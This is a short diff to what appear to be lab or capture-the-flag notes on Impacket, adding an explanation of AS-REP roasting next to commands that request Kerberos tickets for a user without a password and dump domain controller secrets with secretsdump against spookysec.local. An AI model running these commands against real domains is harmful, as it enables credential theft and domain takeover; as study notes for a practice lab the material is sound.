@@ -1,6 +1,9 @@
 #/opt/examples/impacket
 
 impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip 10.10.121.27 
+
+#*The GetNPUsers script from the Impacket library can retrieve TGTs for users who have the “Do not require Kerberos preauthentication” property enabled.
+In scenarios where a domain controller is vulnerable to an LDAP null bind, retrieving the user's AS_REP message without requiring authentication becomes possible.
 --------------------------------------------------------------------------------
 
 impacket-secretsdump spookysec.local/backup:password@10.10.106.230 -just-dc
